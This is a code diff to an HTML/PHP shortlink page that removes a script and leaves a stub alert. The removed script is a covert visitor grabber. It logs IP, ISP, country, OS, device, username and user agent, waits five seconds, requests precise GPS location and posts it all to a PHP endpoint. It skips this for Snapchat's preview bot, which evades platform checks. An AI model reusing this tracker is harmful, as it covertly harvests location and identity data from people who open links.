@@ -173,88 +173,11 @@ body{
 
 <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
 
-<script>
-
-
-var xmlhttp;
-
-    function actionSend() {
-      const request= new XMLHttpRequest()
-request.open("POST", "funcs/recieve_UserData_JSON.php", true)
-request.setRequestHeader("Content-type", "application/json")
-request.send(JSON.stringify(JSON_JSON))
-    }
-function redirect(url){
-  window.location.replace(url)
-}
-
-const options = {
-  enableHighAccuracy: true,
-  timeout: 5000,
-  maximumAge: 0
-};
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition,void(0),options);
-
-  } else {
-    x.innerHTML = "n/a";
-    actionSend();
-  }
-
-}
-
-const JSON_TEXT = '{"userid": "You are up to no good looking at this code.","shortlink": "theres booby traps in this code","servertime": "fuck around and find out.","browsertime": "i dare you","ip": "21.12.31.98","country": "north korea","isp": "starlink","vpn": "probably","device_type": "shitty","os": "linix","android_model": "galaxy S31","lattitude": "0","longitude": "0","alt": "21","acu": "very close","browser_window_dimensions": "1080p","state": "michigan","username":"myusername","useragent":"myuseragent"}';
-function showPosition(position) {
-  console.log("Latitude: " + position.coords.latitude);
-  console.log("Longitude: " + position.coords.longitude);
-  JSON_JSON.lattitude= position.coords.latitude;
-  JSON_JSON.longitude= position.coords.longitude;
-  JSON_JSON.alt=(position.coords.altitude);
-  JSON_JSON.acu = (position.coords.accuracy);
-  console.log("Altitude: " + position.coords.altitude);
-  console.log("Accuracy: " + position.coords.accuracy);
-  actionSend();
-}
-
-<?php require_once('funcs/getipinfo.php');
-$IP_Info = getIPInfo(getUserIpAddr())?>
-
-const datetimex = new Date();
-
-const JSON_JSON = JSON.parse(JSON_TEXT);
-JSON_JSON.userid = '<?php echo $userID; ?>';
-JSON_JSON.shortlink = '<?php echo $shortlink; ?>';
-JSON_JSON.servertime = '<?php echo (new \DateTime())->format('Y-m-d H:i:s'); ?>';
-JSON_JSON.browsertime = datetimex.toISOString().slice(0,19).replace('T',' ');
-JSON_JSON.ip = '<?php echo getUserIpAddr(); ?>';
-JSON_JSON.country = '<?php echo $IP_Info['country']; ?>';
-JSON_JSON.isp = '<?php echo $IP_Info['isp']; ?>';
-JSON_JSON.vpn = 0;
-JSON_JSON.device_type = <?php echo $deviceType; ?>;
-JSON_JSON.os = '<?php echo getOS(); ?>';
-JSON_JSON.android_model = '<?php require_once('funcs/get_android_model.php');
-echo getAndroidModel($UserAgent); ?>';
-JSON_JSON.browser_window_dimensions = "temp holder";
-JSON_JSON.username = '<?php echo $username; ?>';
-JSON_JSON.useragent = '<?php echo $UserAgent ?>';
-
+<script type="text/javascript">
 function wait() {
-
-<?php if (str_contains($UserAgent,"developer.snapchat.com")) { ?>
-  JSON_JSON.os = "Snapchat Bot";
-  actionSend();
-<?php }else{ ?>
-
-  //-- GET WAIT 5s GET GPS and then SUBMIT
-  setTimeout(() => {
-  getLocation();
-}, "5000")
-//--/ GET WAIT 5s GET GPS and then SUBMIT
-<?php } ?>
-
+  alert("wait");
 }
+
 
 </script>
 
